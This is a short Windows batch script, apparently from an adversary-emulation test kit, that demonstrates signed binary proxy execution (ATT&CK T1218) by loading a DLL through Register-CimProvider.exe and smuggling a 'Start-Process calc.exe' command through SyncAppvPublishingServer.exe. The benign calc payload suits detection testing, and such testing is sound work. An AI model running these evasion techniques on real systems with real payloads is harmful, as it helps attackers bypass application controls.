@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Signed Binary Proxy Execution	(T1218)
ECHO.
ECHO [+] Using 'Register-CimProvider' & 'SyncAppvPublishingServer'
ECHO -------------------------------------------------------------------
IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (cmd /c Register-CimProvider.exe -Path %PAYLOAD%T1218\src\x64\T1218.dll) ELSE ( cmd /c Register-CimProvider.exe -Path %PAYLOAD%T1218\src\Win32\T1218.dll )

SyncAppvPublishingServer.exe "n; Start-Process calc.exe"
ECHO.
